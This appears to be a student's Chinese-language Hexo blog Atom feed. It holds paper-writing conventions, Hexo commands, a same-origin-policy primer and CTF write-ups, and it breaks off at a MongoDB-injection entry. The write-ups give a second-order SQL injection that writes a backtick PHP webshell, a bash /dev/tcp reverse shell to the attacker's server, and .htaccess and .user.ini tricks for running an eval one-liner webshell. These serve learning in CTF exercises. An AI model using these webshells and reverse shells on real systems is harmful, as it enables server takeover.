<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>木偶&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-11-03T03:13:31.102Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>木偶</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Paper规范</title>
    <link href="http://yoursite.com/2020/11/03/Paper%E8%A7%84%E8%8C%83/"/>
    <id>http://yoursite.com/2020/11/03/Paper规范/</id>
    <published>2020-11-03T03:37:10.000Z</published>
    <updated>2020-11-03T03:13:31.102Z</updated>
    
    <content type="html"><![CDATA[<p>写Paper及创建Github项目时一些规范</p><a id="more"></a><h3 id="Github-Repo"><a href="#Github-Repo" class="headerlink" title="Github-Repo"></a>Github-Repo</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1. 把code和paper分开到不同的repo，一般paper的repo的命名：</span><br><span class="line">fast21simcomp，&lt;目标会议&gt;&lt;年份&gt;&lt;系统名称&gt;</span><br><span class="line"></span><br><span class="line">2. paper repo里边放submit（投递），camera，revision（每次修订版本）文件夹</span><br><span class="line">初始只需要submit文件夹</span><br><span class="line"></span><br><span class="line">3. submit文件夹内，放所有tex文件、cls文件、bst文件、bib文件</span><br><span class="line">一般有一个main.tex，在main.tex里边include其他tex文件；</span><br><span class="line">包含一个pic文件夹，放所有图片（图片为pdf格式）</span><br><span class="line"></span><br><span class="line">4. submit文件夹内，放一个plot文件夹，放所有画图的源代码</span><br><span class="line">（R语言代码/PPTX）</span><br></pre></td></tr></table></figure><h3 id="Figures"><a href="#Figures" class="headerlink" title="Figures"></a>Figures</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 使用texlive的工具pdfcrop裁剪pdf图片的白边</span><br><span class="line"></span><br><span class="line">2.插图大小规范：</span><br><span class="line">    正常宽度：3.3in</span><br><span class="line">    宽度：高度1:2</span><br><span class="line">    双栏宽度：6.7in</span><br></pre></td></tr></table></figure><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. 使用Jabref管理参考文献，参考文献格式：</span><br><span class="line">InProceedings，会议论文，只填写Title、Author、Booktitle、Year</span><br><span class="line">其中Booktitle应用这种格式：Proc. of [会议出版社/组织] &lt;会议简写&gt;</span><br><span class="line"></span><br><span class="line">Article，期刊论文，填写Title、Author、Journal、Volume、Number、Year、Pages</span><br><span class="line"></span><br><span class="line">Misc，其他（例如书、网页、代码等），通常填写Title和HowPublished</span><br><span class="line"></span><br><span class="line">2. bibtex key规范：&lt;第一作者姓&gt;&lt;有效2位发表年份&gt;[a/b/c...用于区分作者同一年份发表的不同文章]</span><br></pre></td></tr></table></figure><h3 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h3><h4 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h4><h4 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h4>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;写Paper及创建Github项目时一些规范&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>博客初建</title>
    <link href="http://yoursite.com/2020/07/19/hello-world/"/>
    <id>http://yoursite.com/2020/07/19/hello-world/</id>
    <published>2020-07-19T01:55:38.391Z</published>
    <updated>2020-11-03T02:46:45.818Z</updated>
    
    <content type="html"><![CDATA[<p><center>从零开始，希望这个博客可以和我一起进步，逐渐懂得更多。<center></center></center></p><h4 id="博客更新"><a href="#博客更新" class="headerlink" title="博客更新"></a>博客更新</h4><p>生成静态页面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo generate</span><br></pre></td></tr></table></figure><p>预览博客效果 Localhost:4000</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure><p>同步到Github</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo deploy</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;center&gt;从零开始，希望这个博客可以和我一起进步，逐渐懂得更多。&lt;center&gt;&lt;/center&gt;&lt;/center&gt;&lt;/p&gt;
&lt;h4 id=&quot;博客更新&quot;&gt;&lt;a href=&quot;#博客更新&quot; class=&quot;headerlink&quot; title=&quot;博客更新&quot;&gt;&lt;/a&gt;博客更新&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>黑白盒</title>
    <link href="http://yoursite.com/2020/07/19/%E9%BB%91%E7%99%BD%E7%9B%92/"/>
    <id>http://yoursite.com/2020/07/19/黑白盒/</id>
    <published>2020-07-19T01:55:38.328Z</published>
    <updated>2018-11-29T01:24:24.324Z</updated>
    
    <content type="html"><![CDATA[<h1 id="黑白盒复现-补招新题"><a href="#黑白盒复现-补招新题" class="headerlink" title="黑白盒复现(补招新题)"></a>黑白盒复现(补招新题)</h1><p>招新赛的时候没做这道题，前几天听止痒学长讲完之后觉得里面有很多知识点没有了解过，复现的时候也出现了问题，所以把完整的步骤和其中涉及的知识点整理出来吧。  </p><p>首先我们可以看到界面中只有登陆和注册可以打开，可能会存在sql注入，同时在头像处可以上传文件，又可能存在文件上传漏洞。</p><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>1、上传文件是PHP、JSP、ASP等脚本代码，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行；</p><p>2、上传文件是crossdomain.xml，导致可以控制Flash在该域下的行为(其他通过类似方式控制策略文件的情况类似);</p><p>3、上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行植入到pc中。</p><p>4、上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。<br><a id="more"></a><br>在大多数情况下，文件上传漏洞一般都是指“上传的Web脚本被服务器解析从而获取网站shell权限”，也就是webshell，要完成上传漏洞攻击需要满足以下几个条件:</p><p>1、上传的文件能够被Web容器解释执行，所以文件上传后所在的目录需要解析器可以执行目录下的文件，也就是说文件目录必须在web容器覆盖路径内才行。</p><p>2、用户可以直接通过浏览器进行访问这个shell文件，如果web容器不能解析这个文件，那么也不能算是漏洞。</p><p>3、最后，上传的shell文件如果被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功。<br>(来源：看雪)</p><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>在图片上传上我们看到上传图片的地址已知，访问地址可以看到我们上传上去的图片，所以我们可以利用SQL写入一句话getshell，再反弹shell从服务器中拿到flag。</p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>网站对我们输入的一些关键字符进行了转义，但在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了该数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。  </p><p>在注册用户名时我们发现当我们的用户名为 1’ 时 登陆后显示的是 1\’ 所以网页对’进行了转义，但当我们在查看用户信息时我们的user_name<br>显示为 1’ 所以说明我们的用户名已经被存储在数据库之中，并且从数据库中提取出来不会存在转义，这就造成了一个二次注入。</p><h4 id="Into-outfile"><a href="#Into-outfile" class="headerlink" title="Into outfile"></a>Into outfile</h4><p>导出数据到pc的指定目录下。<br>在一开始的图片文件上传的时候我们看到存在/var/www/html/favicon/xxx可以读取和查看文件，所以我们将一句话写入这个地方<br>/var/www/html/一般为网站的根目录</p><h4 id="注册-lt-php-GET-x-gt"><a href="#注册-lt-php-GET-x-gt" class="headerlink" title="注册&lt;?php $_GET[x];?&gt;"></a>注册&lt;?php <code>$_GET[x]</code>;?&gt;</h4><p>&lt;?php <code>$_GET[x]</code>;?&gt; PHP中反引号 <code></code> 的作用是把反引号中的内容当做Shell命令执行，我们可以在新创建的的网页上传入变量x值来执行我们想要目标主机执行的命令，注册该用户可以将&lt;?php <code>$_GET[x]</code>;?&gt;写入数据库</p><h4 id="注册-lt-php-GET-x-gt-’into-outfile’-var-www-html-favicon-4-php"><a href="#注册-lt-php-GET-x-gt-’into-outfile’-var-www-html-favicon-4-php" class="headerlink" title="注册&lt;?php $_GET[x];?&gt;’into outfile’/var/www/html/favicon/4.php"></a>注册&lt;?php <code>$_GET[x]</code>;?&gt;’into outfile’/var/www/html/favicon/4.php</h4><p>将&lt;?php <code>$_GET[x]</code>;?&gt;从数据库中提取出来并导出到favicon/4.php<br>此时在4.php中我们就可以通过变量x来上传我们想让目标主机执行的shell命令了</p><h4 id="bash-c-“bash-i-gt-amp-dev-tcp-9999-0-lt-amp-1-2-gt-amp-1”"><a href="#bash-c-“bash-i-gt-amp-dev-tcp-9999-0-lt-amp-1-2-gt-amp-1”" class="headerlink" title="bash -c “bash -i &gt;&amp; /dev/tcp//9999 0&lt;&amp;1 2&gt;&amp;1”"></a>bash -c “bash -i &gt;&amp; /dev/tcp/<your-server-ip>/9999 0&lt;&amp;1 2&gt;&amp;1”</your-server-ip></h4><p>首先，bash -c 就是运行shell脚本 bash -i是打开一个交互的bash，/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。<br>要想了解“&gt;&amp;”、“0&gt;&amp;1”和2&gt;&amp;1，首先我们要先了解一下Linux文件描述符和重定向。</p><p>linux shell下常用的文件描述符是：</p><ol><li><p>标准输入   (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ； </p></li><li><p>标准输出   (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ； </p></li><li><p>标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。</p></li></ol><p>&amp;可以理解为c语言中的取地址符（n&lt;&amp;word 是把word复制给n，n&gt;&amp;word是把word复制给n。）2&gt;&amp;1是将标准错误输出合并到标准输出中，&amp;&gt;是将标准错误输出定向到标准输出中。也就是输出标准输出的同时也会输出标准错误输出。这句话的意思创建一个可交互的bash和一个到xxx.xxx.xxx.xxx的TCP链接，然后将bash的输入输出错误都重定向到在xxx.xxx.xxx.xxx监听的进程。简单来说就是A主机可以通过执行B主机上的命令并且把返回值都返回到A上。</p><h5 id="这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell-复现的时候就在这出了问题，菜的真实…"><a href="#这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell-复现的时候就在这出了问题，菜的真实…" class="headerlink" title="这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell(复现的时候就在这出了问题，菜的真实….)"></a>这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell(复现的时候就在这出了问题，菜的真实….)</h5><p>之后再服务器开启监听 nc -lvnp 9999  </p><p>现在我们之前所传的一句话就派上了用场，在4.php的地址后构造?x=bash%20-c%20%22bash%20-i%20%3E%26%20%2fdev%2ftcp/<your-server-ip>/9999 0%3C%26%202%3E%261%22 就可以让目标主机执行这个命令  </your-server-ip></p><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p>A主机开启9999端口的tcp服务<br>B主机连接到A主机的9999的tcp服务<br>A主机通过tcp服务把命令发到B主机<br>B主机读取命令并且在bash中执行<br>B主机把执行结果发给A主机</p><p>拿到shell之后就可以 cd / 进入主目录，主目录中存在包含flag的文件<br><img src="/2020/07/19/黑白盒/1.png" alt=" "><br>cat读取文件就可以拿到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;黑白盒复现-补招新题&quot;&gt;&lt;a href=&quot;#黑白盒复现-补招新题&quot; class=&quot;headerlink&quot; title=&quot;黑白盒复现(补招新题)&quot;&gt;&lt;/a&gt;黑白盒复现(补招新题)&lt;/h1&gt;&lt;p&gt;招新赛的时候没做这道题，前几天听止痒学长讲完之后觉得里面有很多知识点没有了解过，复现的时候也出现了问题，所以把完整的步骤和其中涉及的知识点整理出来吧。  &lt;/p&gt;
&lt;p&gt;首先我们可以看到界面中只有登陆和注册可以打开，可能会存在sql注入，同时在头像处可以上传文件，又可能存在文件上传漏洞。&lt;/p&gt;
&lt;h3 id=&quot;文件上传漏洞&quot;&gt;&lt;a href=&quot;#文件上传漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞&quot;&gt;&lt;/a&gt;文件上传漏洞&lt;/h3&gt;&lt;h4 id=&quot;分类&quot;&gt;&lt;a href=&quot;#分类&quot; class=&quot;headerlink&quot; title=&quot;分类&quot;&gt;&lt;/a&gt;分类&lt;/h4&gt;&lt;p&gt;1、上传文件是PHP、JSP、ASP等脚本代码，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行；&lt;/p&gt;
&lt;p&gt;2、上传文件是crossdomain.xml，导致可以控制Flash在该域下的行为(其他通过类似方式控制策略文件的情况类似);&lt;/p&gt;
&lt;p&gt;3、上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行植入到pc中。&lt;/p&gt;
&lt;p&gt;4、上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Web复现" scheme="http://yoursite.com/categories/Web%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>同源策略</title>
    <link href="http://yoursite.com/2020/07/19/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"/>
    <id>http://yoursite.com/2020/07/19/同源策略/</id>
    <published>2020-07-19T01:55:38.313Z</published>
    <updated>2018-11-19T09:56:32.033Z</updated>
    
    <content type="html"><![CDATA[<h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p>最近在补一些基础知识，在浏览器安全最开头就看到了一个新的名词：同源策略</p><h2 id="首先是源的概念："><a href="#首先是源的概念：" class="headerlink" title="首先是源的概念："></a>首先是源的概念：</h2><p>•    源（origin）就是协议、域名和端口号。 以下是相对于 <a href="http://www.a.com/test/index.html" target="_blank" rel="noopener">http://www.a.com/test/index.html</a> 的同源检测<br>•    <a href="http://www.a.com/dir/page.html" target="_blank" rel="noopener">http://www.a.com/dir/page.html</a> —-成功<br>•    <a href="http://www.child.a.com/test/index.html" target="_blank" rel="noopener">http://www.child.a.com/test/index.html</a> —-失败，域名不同<br>•    <a href="https://www.a.com/test/index.html" target="_blank" rel="noopener">https://www.a.com/test/index.html</a> —-失败，协议不同<br>所以所谓同源就是协议、域名和端口号均相同。</p><h2 id="什么是同源策略："><a href="#什么是同源策略：" class="headerlink" title="什么是同源策略："></a>什么是同源策略：</h2><a id="more"></a><p>同源策略是一种约定，限制了来自不同源的“document”或脚本，对当前“doucument”的读取或者设置某些属性。</p><h6 id="举个例子："><a href="#举个例子：" class="headerlink" title="举个例子："></a>举个例子：</h6><p>如果没有同源策略，可能a.com里的一段JS脚本在b.com未加载此脚本时也可以修改b.com的内容。 同源策略限制了不同源的对象之间的互相干扰，也就是说当JS被浏览器认为来自不同源时，请求被拒绝。注意，对于当前页面来说，页面里存放JS文件的域不重要，重要的是加载JS界面的域是什么。</p><h2 id="什么是跨域"><a href="#什么是跨域" class="headerlink" title="什么是跨域"></a>什么是跨域</h2><p>浏览器从一个域名的网页去请求另一个域名的资源时，域名、端口、协议任一不同，都是跨域</p><h6 id="不受同源策略限制的："><a href="#不受同源策略限制的：" class="headerlink" title="不受同源策略限制的："></a>不受同源策略限制的：</h6><p>1、页面中的链接，重定向以及表单提交是不会受到同源策略限制的。<br> 2、跨域资源的引入是可以的。但是js不能读写加载的内容。如嵌入到页面中的 &lt; script src=”…” &gt; &lt; /script &gt;，&lt; img &gt;，&lt; link &gt;，&lt; iframe &gt;等。 所以我们就可以利用&lt; script &gt;标签来绕过了同源策略，来找到跨域漏洞。</p><p>第一次写博客，内容不是很全，也会有许多错误的地方，了解的知识很有限，一些名词和漏洞名称从来没有接触过，希望大家可以指出错误。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;同源策略&quot;&gt;&lt;a href=&quot;#同源策略&quot; class=&quot;headerlink&quot; title=&quot;同源策略&quot;&gt;&lt;/a&gt;同源策略&lt;/h1&gt;&lt;p&gt;最近在补一些基础知识，在浏览器安全最开头就看到了一个新的名词：同源策略&lt;/p&gt;
&lt;h2 id=&quot;首先是源的概念：&quot;&gt;&lt;a href=&quot;#首先是源的概念：&quot; class=&quot;headerlink&quot; title=&quot;首先是源的概念：&quot;&gt;&lt;/a&gt;首先是源的概念：&lt;/h2&gt;&lt;p&gt;•    源（origin）就是协议、域名和端口号。 以下是相对于 &lt;a href=&quot;http://www.a.com/test/index.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.a.com/test/index.html&lt;/a&gt; 的同源检测&lt;br&gt;•    &lt;a href=&quot;http://www.a.com/dir/page.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.a.com/dir/page.html&lt;/a&gt; —-成功&lt;br&gt;•    &lt;a href=&quot;http://www.child.a.com/test/index.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.child.a.com/test/index.html&lt;/a&gt; —-失败，域名不同&lt;br&gt;•    &lt;a href=&quot;https://www.a.com/test/index.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.a.com/test/index.html&lt;/a&gt; —-失败，协议不同&lt;br&gt;所以所谓同源就是协议、域名和端口号均相同。&lt;/p&gt;
&lt;h2 id=&quot;什么是同源策略：&quot;&gt;&lt;a href=&quot;#什么是同源策略：&quot; class=&quot;headerlink&quot; title=&quot;什么是同源策略：&quot;&gt;&lt;/a&gt;什么是同源策略：&lt;/h2&gt;
    
    </summary>
    
      <category term="基础" scheme="http://yoursite.com/categories/%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="基础" scheme="http://yoursite.com/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>文件解析漏洞</title>
    <link href="http://yoursite.com/2019/10/08/htaccess%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90/"/>
    <id>http://yoursite.com/2019/10/08/htaccess文件解析/</id>
    <published>2019-10-08T12:30:10.000Z</published>
    <updated>2019-10-15T13:15:58.980Z</updated>
    
    <content type="html"><![CDATA[<h3 id="htaccess"><a href="#htaccess" class="headerlink" title="htaccess"></a><code>htaccess</code></h3><p><code>htaccess</code>文件(分布式配置文件，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。</p><ol><li><p>设置初始页面</p></li><li><p>错误重定向&amp;重定向</p></li><li><p>设置文件访问权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files 1.php&gt;</span><br><span class="line">order allow,deny</span><br><span class="line">deny from all</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure></li></ol><a id="more"></a><p>开启<code>htaccess</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apache 配置文件里httpd.conf文件找到</span><br><span class="line"></span><br><span class="line"> AllowOverride None改为AllowOverride All </span><br><span class="line"></span><br><span class="line"> LoadModule rewrite_module modules/mod_rewrite.so 把这个前面的“#”号去掉</span><br><span class="line"></span><br><span class="line"> 然后重启apache。</span><br></pre></td></tr></table></figure><p>针对一些黑名单的限制，php文件无法上传或者无法被解析，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AppType    application/x-httpd-php     .jpg</span><br><span class="line"></span><br><span class="line">将所有jpg文件解析未php文件</span><br><span class="line">再结合一句话图片马就可以拿到shell</span><br></pre></td></tr></table></figure><h4 id="X-NUCA-ezphp"><a href="#X-NUCA-ezphp" class="headerlink" title="X-NUCA ezphp"></a><code>X-NUCA ezphp</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    $files = scandir(&apos;./&apos;);  </span><br><span class="line">    foreach($files as $file) &#123; </span><br><span class="line">        if(is_file($file))&#123; </span><br><span class="line">            if ($file !== &quot;index.php&quot;) &#123; </span><br><span class="line">                unlink($file); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    include_once(&quot;fl3g.php&quot;); </span><br><span class="line">    if(!isset($_GET[&apos;content&apos;]) || !isset($_GET[&apos;filename&apos;])) &#123; </span><br><span class="line">        highlight_file(__FILE__); </span><br><span class="line">        die(); </span><br><span class="line">    &#125; </span><br><span class="line">    $content = $_GET[&apos;content&apos;]; </span><br><span class="line">    if(stristr($content,&apos;on&apos;) || stristr($content,&apos;html&apos;) || stristr($content,&apos;type&apos;) || stristr($content,&apos;flag&apos;) || stristr($content,&apos;upload&apos;) || stristr($content,&apos;file&apos;)) &#123; </span><br><span class="line">        echo &quot;Hacker&quot;; </span><br><span class="line">        die(); </span><br><span class="line">    &#125; </span><br><span class="line">    $filename = $_GET[&apos;filename&apos;]; </span><br><span class="line">    if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1) &#123; </span><br><span class="line">        echo &quot;Hacker&quot;; </span><br><span class="line">        die(); </span><br><span class="line">    &#125; </span><br><span class="line">    $files = scandir(&apos;./&apos;);  </span><br><span class="line">    foreach($files as $file) &#123; </span><br><span class="line">        if(is_file($file))&#123; </span><br><span class="line">            if ($file !== &quot;index.php&quot;) &#123; </span><br><span class="line">                unlink($file); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    file_put_contents($filename, $content . &quot;\nJust one chance&quot;); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>文件只能传一个</p><p>开始一直500，差点放弃<code>htaccess</code>，后来发现可能是后面拼接的那个字符串不符合htaccess文件的编写规则，</p><p>使用反斜杠换行符将其和注释拼接在一起</p><p>最后面加一行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#fuck\</span><br></pre></td></tr></table></figure><p>同样利用\绕过那些敏感字符，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch “a”&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">加上反斜杠拼接就可以正常写入htaccess文件，并将我们传入的a文件解析为php</span><br></pre></td></tr></table></figure><h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a><code>.user.ini</code></h3><p>除了主<code>php.ini</code>之外，<code>PHP</code>还会在每个目录下扫描<code>INI</code> 文件，从被执行的<code>PHP</code>文件所在目录开始一直上升到 web 根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=12.jpg</span><br><span class="line"></span><br><span class="line">所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。</span><br></pre></td></tr></table></figure><h4 id="SUCTF-CheckIn"><a href="#SUCTF-CheckIn" class="headerlink" title="SUCTF CheckIn"></a><code>SUCTF CheckIn</code></h4><p>先上传一个图片文件，留下文件头</p><p>加上一句话木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_GET[h]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>绕过了<code>&lt;?</code>的限制</p><p><img src="/2019/10/08/htaccess文件解析/Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1570544831768.png" alt="1570544831768"></p><p>后上传.<code>user.ini</code>文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=12.jpg</span><br></pre></td></tr></table></figure><p>包含该文件</p><p><img src="/2019/10/08/htaccess文件解析/Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1570544854762.png" alt="1570544854762"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">之后phpinfo测试可行</span><br><span class="line"></span><br><span class="line">/uploads/f4e7685fe689f675c85caeefaedcf40c/index.php?h=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/2019/10/08/htaccess文件解析/Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1570544947029.png" alt="1570544947029"></p><p>菜刀连接拿到flag</p><p><img src="/2019/10/08/htaccess文件解析/Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1570546074326.png" alt="1570546074326"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;htaccess&quot;&gt;&lt;a href=&quot;#htaccess&quot; class=&quot;headerlink&quot; title=&quot;htaccess&quot;&gt;&lt;/a&gt;&lt;code&gt;htaccess&lt;/code&gt;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;htaccess&lt;/code&gt;文件(分布式配置文件，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;设置初始页面&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;错误重定向&amp;amp;重定向&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;设置文件访问权限&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;Files 1.php&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;order allow,deny&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deny from all&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;/Files&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="WP" scheme="http://yoursite.com/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>mongodb注入</title>
    <link href="http://yoursite.com/2019/08/13/mongodb%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2019/08/13/mongodb注入/</id>
    <published>2019-08-13T10:34:25.000Z</published>
    <updated>2019-10-11T07:59:34.045Z</updated>
    
